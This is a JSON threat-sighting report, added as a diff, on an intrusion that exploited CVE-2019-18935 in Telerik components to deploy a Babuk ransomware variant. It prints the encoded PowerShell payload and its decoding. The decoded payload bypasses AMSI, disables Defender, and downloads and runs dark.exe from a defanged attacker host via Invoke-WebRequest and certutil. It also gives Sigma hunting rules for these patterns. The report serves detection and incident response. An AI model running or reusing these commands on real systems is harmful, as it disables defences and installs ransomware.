@@ -1,0 +1,379 @@
+{
+  "header": {
+    "sightingReportId": "d5bc8a5b-7c29-4f20-9108-3cbeb8c360f6",
+    "status": "wip",
+    "description": "Unknown Threat Actor exploited vulnerability on Telerik UI for ASP.NET AJAX controls (CVE-2019-18935) to deploy a variant of Babuk ransomware. In this Threat Sighting, ENS blocked (detected and deleted) the 2nd stage malware, we've complemented the Sighting with OSINT.",
+    "author": "Alejandro Houspanossian (@lekz86)",
+    "acknowledgement": "@VirITeXplorer, @th3_protoCOL, @lekz86",
+    "tlp": "white",
+    "threatInformation": {
+      "adversaries": [
+        "n/d"
+      ],
+      "malware": [
+        "n/d"
+      ],
+      "tools": [
+        "powershell",
+        "w3wp"
+      ],
+      "lolbas": [
+        "cmd",
+        "certutil"
+      ]
+    }
+  },
+  "threatSightings": [
+    {
+      "sighting": "Initial Access - Threat Actor used an exploit on a vulnerable component of a Public-Facing Application do drop malicious DLL for Initial Access.",
+      "id": "6fe8349a-1212-42fd-8558-5b81fdca5e1d",
+      "behaviors": [
+        {
+          "behavior": "Internet Information Services -IIS- Worker Process -_w3wp.exe_- ran Public-Facing Application (Brillium Assessment Software).",
+          "type": "Process Created",
+          "id": "ff45bed0-6b80-4056-911f-fe66b3cb6302",
+          "weapon": "w3wp",
+          "processes": [
+            {
+              "cmdLine": [
+                "C:\\\\Windows\\\\SysWOW64\\\\inetsrv\\\\w3wp.exe -ap \\\"BrilliumAppPool\\\" -v \\\"v4.0\\\" -l \\\"webengine4.dll\\\" -a \\\\\\\\.\\\\pipe\\\\iisipmb4ec5225-60c6-4ac5-b0ca-42819f013936 -h \\\"C:\\\\inetpub\\\\temp\\\\apppools\\\\BrilliumAppPool\\\\BrilliumAppPool.config\\\" -w \\\"\\\" -m 0 -t 20 -ta 0"
+              ],
+              "process": "C:\\\\Windows\\\\SysWOW64\\\\inetsrv\\\\w3wp.exe",
+              "parentProcess": "C:\\\\Windows\\\\SysWOW64\\\\services.exe"
+            }
+          ],
+          "notes": [
+            "w3wp.exe is Internet Information Services (IIS) Worker Process",
+            "BrilliumAppPool is part of Brillium Assessment Software, a web application that apparently uses Telerik ASP.NET AJAX components (https://secure.testcraft.com/ex/Versions1.aspx)",
+            "Telerik ASP.NET AJAX components are vulnerable to CVE-2019-18935, which enables remote code execution."
+          ]
+        },
+        {
+          "behavior": "IIS Worker Process -_w3wp.exe_- drops malicious dll.",
+          "type": "File Created",
+          "id": "51382768-0dea-49c5-9663-80091a5464c5",
+          "weapon": "maldll",
+          "files": [
+            {
+              "name": "1634071049.71722.dll.tmp",
+              "path": "C:\\\\Windows\\\\Temp\\\\1634071049.71722.dll.tmp",
+              "sha256": "56B7E6DD46E38A30EAD82790947A425661AD893F54060381C9B76616C27D3B9F",
+              "process": "C:\\\\Windows\\\\SysWOW64\\\\inetsrv\\\\w3wp.exe"
+            }
+          ],
+          "notes": [
+            "33/66 @ VT. First submitted by the time of this sighting (https://www.virustotal.com/gui/file/56b7e6dd46e38a30ead82790947a425661ad893f54060381c9b76616c27d3b9f)",
+            "There is a known vulnerability on Telerik ASP.NET AJAX components (https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-18935)"
+          ],
+          "att&ck": {
+            "initialAccess": [
+              "T1190 - Exploit Public-Facing Application"
+            ]
+          }
+        }
+      ]
+    },
+    {
+      "sighting": "Initial Access - Threat Actor used an exploit on Public-Facing Application to execute an encoded PowerShell command for Execution.",
+      "id": "73760b2b-d299-4ddd-8806-4965777d3dd5",
+      "behaviors": [
+        {
+          "behavior": "IIS worker process (w3wp.exe) launched CMD for encoded PowerShell command execution.",
+          "type": "Process Created",
+          "id": "881ee565-6d14-4ac3-b4ae-bcc4101546b1",
+          "weapon": "powershell",
+          "processes": [
+            {
+              "cmdLine": [
+                "C:\\\\Windows\\\\system32\\\\cmd.exe /c powershell.exe -nop -w hidden -e JAB3ACAAPQAgA[REDACTED]"
+              ],
+              "process": "c:\\\\windows\\\\system32\\\\cmd.exe",
+              "parentProcess": "C:\\\\Windows\\\\SysWOW64\\\\inetsrv\\\\w3wp.exe"
+            }
+          ],
+          "notes": [
+            "A common pattern after explotation of externally facing wep applications is to see IIS worker process (w3wp.exe) as parent process of suspcicious process execution."
+          ],
+          "att&ck": {
+            "execution": [
+              "T1203 - Exploitation for Client Execution",
+              "T1059.001 - Command and Scripting Interpreter: PowerShell",
+              "T1059.003 - Command and Scripting Interpreter: Windows Command Shell"
+            ],
+            "initialAccess": [
+              "T1190 - Exploit Public-Facing Application"
+            ]
+          }
+        }
+      ]
+    },
+    {
+      "sighting": "Execution - Threat Actor used _encoded PowerShell command_ for dropping additional artifacts for Command And Control.",
+      "id": "21260b2b-d299-4ddd-8806-4965777d2dd2",
+      "behaviors": [
+        {
+          "behavior": "Malicious PowerShell command execution for malware download.",
+          "type": "Process Created",
+          "id": "3a4a1dba-1fd5-4e49-89ec-66cfc59c8a93",
+          "weapon": "powershell",
+          "processes": [
+            {
+              "cmdLine": [
+                "powershell.exe  -nop -w hidden -e JAB3ACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYwAgAD0AIAAnAHMAaQAnADsAJABtACAAPQAgACcAVQB0AGkAbABzACcAOwAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AG0AewAxAH0AewAyAH0AJwAgAC0AZgAgACQAdwAsACQAYwAsACQAbQApACkAIAA7ACAAJABmAGkAZQBsAGQAIAA9ACAAJABhAHMAcwBlAG0AYgBsAHkALgBHAGUAdABGAGkAZQBsAGQAKAAoACcAYQBtAHsAMAB9AEkAbgBpAHQARgBhAGkAbABlAGQAJwAgAC0AZgAgACQAYwApACwAJwBOAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQA7ACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwBTAGUAdAAtAE0AcABQAHIAZQBmAGUAcgBlAG4AYwBlACAALQBEAGkAcwBhAGIAbABlAFIAZQBhAGwAdABpAG0AZQBNAG8AbgBpAHQAbwByAGkAbgBnACAAJAB0AHIAdQBlACAALQBEAGkAcwBhAGIAbABlAFMAYwByAGkAcAB0AFMAYwBhAG4AbgBpAG4AZwAgACQAdAByAHUAZQAgAC0ARABpAHMAYQBiAGwAZQBCAGUAaABhAHYAaQBvAHIATQBvAG4AaQB0AG8AcgBpAG4AZwAgACQAdAByAHUAZQAgAC0ARABpAHMAYQBiAGwAZQBJAE8AQQBWAFAAcgBvAHQAZQBjAHQAaQBvAG4AIAAkAHQAcgB1AGUAIAAtAEQAaQBzAGEAYgBsAGUASQBuAHQAcgB1AHMAaQBvAG4AUAByAGUAdgBlAG4AdABpAG8AbgBTAHkAcwB0AGUAbQAgACQAdAByAHUAZQA7ACAAWwBSAGUAZgBdAC4AQQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQAVAB5AHAAZQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAbQBzAGkAVQB0AGkAbABzACcAKQAuAEcAZQB0AEYAaQBlAGwAZAAoACcAYQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcALAAgACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAGUAdABWAGEAbAB1AGUAKAAkAG4AdQBsAGwALAAkAHQAcgB1AGUAKQA7AEkAbgB2AG8AawBlAC0AVwBlAGIAcgBlAHEAdQBlAHMAdAAgAC0AdQByAGkAIABoAHQAdABwADoALwAvAGYAYgBpAC4AZgB1AG4AZAAvAGQAYQByAGsALgBlAHgAZQAgAC0AbwB1AHQAZgBpAGwAZQAgAGQAYQByAGsALgBlAHgAZQA7AGMAZQByAHQAdQB0AGkAbAAuAGUAeABlACAALQB1AHIAbABjAGEAYwBoAGUAIAAtAHMAcABsAGkAdAAgAC0AZgAgAGgAdAB0AHAAOgAvAC8AZgBiAGkALgBmAHUAbgBkAC8AZABhAHIAawAuAGUAeABlACAAOwAgAC4AXABkAGEAcgBrAC4AZQB4AGUA"
+              ],
+              "process": "C:\\\\Windows\\\\System32\\\\WindowsPowershell\\\\v1.0\\\\powershell.exe",
+              "parentProcess": "c:\\\\windows\\\\system32\\\\cmd.exe"
+            }
+          ],
+          "notes": [
+            "Payload includes an attempt to bypass AMSI",
+            "Payload includes an attempt to download and execute additional malware.",
+            "Decoded b64 payload follows",
+            "$w = \\'System.Management.Automation.A\\'; $c = \\'si\\'; $m = \\'Utils\\'; $assembly = [Ref].Assembly.GetType((\\'{0}m{1}{2}\\' -f $w,$c,$m)); $field = $assembly.GetField((\\'am{0}InitFailed\\' -f $c),\\'NonPublic,Static\\'); $field.SetValue($null,$true); Set-MpPreference -DisableRealtimeMonitoring $true -DisableScriptScanning $true -DisableBehaviorMonitoring $true -DisableIOAVProtection $true -DisableIntrusionPreventionSystem $true; [Ref].Assembly.GetType(\\'System.Management.Automation.AmsiUtils\\').GetField(\\'amsiInitFailed\\', \\'NonPublic,Static\\').SetValue($null,$true); Invoke-Webrequest -uri http://fbi[.]fund/dark.exe -outfile dark.exe; certutil.exe -urlcache -split -f http://fbi[.]fund/dark.exe; .\\\\dark.exe;"
+          ],
+          "att&ck": {
+            "execution": [
+              "T1059.001 - Command and Scripting Interpreter: PowerShell"
+            ],
+            "defenseEvasion": [
+              "T1562.001 - Impair Defenses: Disable or Modify Tools",
+              "T1027 - Obfuscated Files or Information"
+            ],
+            "commandAndControl": [
+              "T1105 - Ingress Tool Transfer"
+            ]
+          }
+        },
+        {
+          "behavior": "PowerShell performs DNS Query (fbi[.]fund).",
+          "type": "DNS Queried",
+          "weapon": "powershell",
+          "id": "346d63b6-fd29-4c5a-9d94-6dfd3b10ea90",
+          "connections": [
+            {
+              "dstIp": "n/d",
+              "dstHost": "fbi[.]fund",
+              "protocol": "n/d",
+              "direction": "outbound",
+              "process": "C:\\Windows\\System32\\WindowsPowershell\\v1.0\\powershell.exe"
+            }
+          ],
+          "notes": [
+            "Invoke-Webrequest -uri http://fbi[.]fund/dark.exe -outfile dark.exe"
+          ]
+        },
+        {
+          "behavior": "PowerShell performs network connection (185.219.52[.]229)",
+          "type": "Network Accessed",
+          "id": "b1357f29-402c-4a7f-a9b1-24a69ac75c42",
+          "weapon": "powershell",
+          "connections": [
+            {
+              "dstIp": "185.219.52[.]229",
+              "dstHost": "fbi[.]fund",
+              "dstPort": 80,
+              "protocol": "tcp",
+              "direction": "outbound",
+              "process": "C:\\\\Windows\\\\System32\\\\WindowsPowershell\\\\v1.0\\\\powershell.exe"
+            }
+          ],
+          "notes": [
+            "This IP has been seen delivering dark.exe and other binaries (https://urlscan.io/search/#185.219.52.229)"
+          ],
+          "att&ck": {
+            "commandAndControl": [
+              "T1071.001 - Application Layer Protocol: Web Protocols"
+            ],
+            "execution": [
+              "T1059.001 - Command and Scripting Interpreter: PowerShell"
+            ]
+          }
+        }
+      ]
+    },
+    {
+      "sighting": "Execution - Threat Actor used _CERTUTIL via PowerShell_ to download additional artifacts for Command And Control.",
+      "id": "14160b2b-d299-4ddd-8806-4965777d3dd1",
+      "behaviors": [
+        {
+          "behavior": "_PowerShell_ launched _CERTUTIL_ to download additional malware.",
+          "type": "Process Created",
+          "id": "26d72ce6-8892-49e5-88c8-67021a4819a6",
+          "weapon": "certutil",
+          "processes": [
+            {
+              "cmdLine": [
+                "\\\"C:\\\\Windows\\\\system32\\\\certutil.exe\\\" -urlcache -split -f http://fbi[.]fund/dark.exe"
+              ],
+              "process": "C:\\\\Windows\\\\system32\\\\certutil.exe",
+              "parentProcess": "C:\\\\Windows\\\\System32\\\\WindowsPowershell\\\\v1.0\\\\powershell.exe"
+            }
+          ],
+          "att&ck": {
+            "execution": [
+              "T1059.001 - Command and Scripting Interpreter: PowerShell"
+            ],
+            "commandAndControl": [
+              "T1105 - Ingress Tool Transfer"
+            ]
+          }
+        },
+        {
+          "behavior": "_CERTUTIL_ performed DNS Query (fbi[.]fund)",
+          "type": "DNS Queried",
+          "id": "4bdbf46f-7608-4463-9a92-8dee4798d888",
+          "weapon": "certutil",
+          "connections": [
+            {
+              "dstIp": "n/d",
+              "dstHost": "fbi[.]fund",
+              "protocol": "n/d",
+              "direction": "outbound",
+              "process": "C:\\Windows\\system32\\certutil.exe"
+            }
+          ]
+        },
+        {
+          "behavior": "_CERTUTIL_ performed network connection (185.219.52[.]229)",
+          "type": "Network Accessed",
+          "id": "de0fefef-f492-4cbd-8812-7c6dfc6a672a",
+          "weapon": "certutil",
+          "connections": [
+            {
+              "dstIp": "185.219.52[.]229",
+              "dstHost": "fbi[.]fund",
+              "dstPort": 80,
+              "protocol": "tcp",
+              "direction": "outbound",
+              "process": "C:\\\\Windows\\\\system32\\\\certutil.exe"
+            }
+          ],
+          "att&ck": {
+            "commandAndControl": [
+              "T1071.001 - Application Layer Protocol: Web Protocols"
+            ],
+            "execution": [
+              "T1059.001 - Command and Scripting Interpreter: PowerShell"
+            ]
+          }
+        },
+        {
+          "behavior": "_CERTUTIL_ attempted to download additional malware (Trojan named GenericRXPZ-PI!CD66BE302D78 was detected and deleted)",
+          "type": "File Modified",
+          "id": "32f1d2b9-857c-4f08-b73d-061e8d47522f",
+          "weapon": "certutil",
+          "files": [
+            {
+              "name": "B95F7C314E77C19D7A1EC2DDAB877740",
+              "path": "C:\\\\Windows\\\\ServiceProfiles\\\\NetworkService\\\\AppData\\\\LocalLow\\\\Microsoft\\\\CryptnetUrlCache\\\\Content\\\\B95F7C314E77C19D7A1EC2DDAB877740",
+              "sha256": "0994c1fc7f66f88eead2091f31a2137f69d08c3cf9ee0f4a15a842f54253c9d9",
+              "process": "C:\\\\Windows\\\\system32\\\\certutil.exe"
+            }
+          ],
+          "notes": [
+            "NT AUTHORITY\\NETWORK SERVICE ran C:\\\\Windows\\\\SysWOW64\\\\certutil.exe, which attempted to access C:\\\\Windows\\\\ServiceProfiles\\\\NetworkService\\\\AppData\\\\LocalLow\\\\Microsoft\\\\CryptnetUrlCache\\\\Content\\\\B95F7C314E77C19D7A1EC2DDAB877740. The Trojan named GenericRXPZ-PI!CD66BE302D78 was detected and deleted.",
+            "Event corresponds most likely to the donwload attempt for _dark.exe_."
+          ]
+        }
+      ]
+    },
+    {
+      "sighting": "Execution - Threat Actor used _PowerShell_ to run the ransomware binary file for Impact.",
+      "id": "8b7f14ff-91be-4ea2-b3c2-e6e86f8ec4ee",
+      "behaviors": [
+        {
+          "behavior": "PowerShell launches ransomware binary",
+          "type": "Process Created",
+          "id": "92cefea2-11ab-4536-b776-53a3b486045d",
+          "weapon": "adhoc-malware",
+          "processes": [
+            {
+              "cmdLine": [
+                "dark.exe",
+                "tortilla.exe"
+              ],
+              "sha256": "0994c1fc7f66f88eead2091f31a2137f69d08c3cf9ee0f4a15a842f54253c9d9",
+              "process": "*\\\\dark.exe",
+              "parentProcess": "C:\\\\Windows\\\\System32\\\\WindowsPowershell\\\\v1.0\\\\powershell.exe"
+            }
+          ],
+          "notes": [
+            "This behavior was not found on EDR Telemetry by the time of this investigation (as ENS blocked the attack). But there are reports from 2 researchers about similar cases.",
+            "File hash has 37/67 detection @ VT (sample submitted by the time of this investigation)",
+            "Sophos team reports this as ransomware (https://mobile.twitter.com/th3_protoCOL/status/1448701084785000448)",
+            "TG Soft (@VirITeXplorer) reports dark.exe / tortillas.exe to deploy a modified version of Babuk ransomware (https://mobile.twitter.com/VirITeXplorer/status/1448689555083780101)",
+            "TG Soft (@VirITeXplorer) reports ransom note named 'How To Restore Your Files.txt', and file extension for encrypted files as .babyk."
+          ]
+        }
+      ]
+    }
+  ],
+  "threatHunting": [
+    {
+      "query": "Hunt for suspicious encoded PowerShell command triggered by w3wp.exe",
+      "queryId": "a9816572-e255-452b-8e48-84936b36be5f",
+      "type": "sigma",
+      "behaviorIds": [
+        "881ee565-6d14-4ac3-b4ae-bcc4101546b1"
+      ],
+      "logsource": {
+        "category": "process_creation",
+        "product": "windows"
+      },
+      "detection": {
+        "selection": {
+          "ParentImage|endswith": "\\\\w3wp.exe",
+          "CommandLine|contains": [
+            "cmd.exe /c powershell.exe -nop -w hidden -e"
+          ]
+        },
+        "selection2": {
+          "ParentImage|endswith": "\\\\cmd.exe",
+          "Image|endswith": "\\\\powershell.exe",
+          "CommandLine|base64offset|contains": [
+            "certutil.exe -urlcache -split -f",
+            "amsiInitFailed",
+            "Set-MpPreference -DisableRealtimeMonitoring $true"
+          ]
+        },
+        "condition": "any of them"
+      }
+    },
+    {
+      "query": "Hunt for _CERTUTIL_ file download launched by PowerShell command",
+      "queryId": "a54be3d0-f2ed-4fd8-81a5-e8175d504b4a",
+      "type": "sigma",
+      "behaviorIds": [
+        "26d72ce6-8892-49e5-88c8-67021a4819a6"
+      ],
+      "logsource": {
+        "category": "process_creation",
+        "product": "windows"
+      },
+      "detection": {
+        "selection": {
+          "ParentImage|endswith": "\\\\powershell.exe",
+          "Image|endswith": "\\\\certutil.exe",
+          "CommandLine|contains": [
+            "certutil.exe -urlcache -split"
+          ]
+        },
+        "condition": "selection"
+      }
+    }
+  ],
+  "footer": {
+    "changeTracking": {
+      "created": "2021-10-17T00:00:00Z",
+      "lastModified": "2021-03-21T00:00:00Z",
+      "sightingVersion": 1.1,
+      "schemaVersion": 1.7
+    },
+    "references": [
+      "https://twitter.com/th3_protoCOL/status/1448701084785000448",
+      "https://twitter.com/VirITeXplorer/status/1448689555083780101",
+      "https://chuongdong.com//reverse%20engineering/2021/01/03/BabukRansomware/",
+      "https://www.mcafee.com/blogs/other-blogs/mcafee-labs/babuk-ransomware/"
+    ]
+  }
+}
